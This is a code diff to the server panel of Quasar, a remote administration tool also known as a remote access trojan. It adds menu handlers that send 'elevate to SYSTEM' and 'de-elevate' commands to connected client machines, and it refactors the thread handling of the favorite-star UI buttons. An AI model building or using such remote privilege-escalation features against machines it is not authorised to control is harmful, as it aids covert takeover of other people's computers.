@@ -768,6 +768,8 @@ namespace Quasar.Server.Forms
                         AddStarButton(lvi, client);
                         SortClientsByFavoriteStatus();
                     }
+                    //lvi.UseItemStyleForSubItems = false;
+                    //lvi.SubItems[4].ForeColor = Color.Green;
                 });
                 EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                 UpdateWindowTitle();
@@ -897,6 +899,31 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoAskElevate());
+            }
+        }
+
+        private void elevateToSystemToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(new DoElevateSystem());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void deElevateToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoDeElevate());
             }
         }
 
@@ -1553,39 +1580,64 @@ namespace Quasar.Server.Forms
 
         private void UpdateAllStarPositions()
         {
-            this.BeginInvoke(new Action(() =>
-            {
-                // Clean up any star controls that don't have matching clients
-                List<Control> starsToRemove = new List<Control>();
-                foreach (Control control in this.Controls)
-                {
-                    if ((control is PictureBox) && control.Tag is Client starClient)
-                    {
-                        bool found = false;
-                        foreach (ListViewItem item in lstClients.Items)
-                        {
-                            if (item.Tag is Client itemClient && itemClient.Equals(starClient))
-                            {
-                                UpdateStarButtonPosition(control, item);
-                                found = true;
-                                break;
-                            }
-                        }
+            if (this.IsDisposed || !this.IsHandleCreated)
+                return;
 
-                        if (!found)
+            try
+            {
+                if (this.InvokeRequired)
+                {
+                    this.Invoke(new Action(() => UpdateAllStarPositionsInternal()));
+                }
+                else
+                {
+                    UpdateAllStarPositionsInternal();
+                }
+            }
+            catch (InvalidOperationException)
+            {
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Error updating star positions: {ex.Message}", "error");
+            }
+        }
+
+        private void UpdateAllStarPositionsInternal()
+        {
+            if (this.IsDisposed || !this.IsHandleCreated || lstClients == null || lstClients.IsDisposed)
+                return;
+
+            // Clean up any star controls that don't have matching clients
+            List<Control> starsToRemove = new List<Control>();
+            foreach (Control control in lstClients.Controls)
+            {
+                if (control is Button && control.Tag is Client starClient)
+                {
+                    bool found = false;
+                    foreach (ListViewItem item in lstClients.Items)
+                    {
+                        if (item.Tag is Client itemClient && itemClient.Equals(starClient))
                         {
-                            starsToRemove.Add(control);
+                            UpdateStarButtonPosition(control, item);
+                            found = true;
+                            break;
                         }
                     }
-                }
 
-                // Remove stars for clients that no longer exist
-                foreach (var control in starsToRemove)
-                {
-                    this.Controls.Remove(control);
-                    control.Dispose();
+                    if (!found)
+                    {
+                        starsToRemove.Add(control);
+                    }
                 }
-            }));
+            }
+
+            // Remove stars for clients that no longer exist
+            foreach (var control in starsToRemove)
+            {
+                lstClients.Controls.Remove(control);
+                control.Dispose();
+            }
         }
 
         private void lstClients_MouseWheel(object sender, MouseEventArgs e)
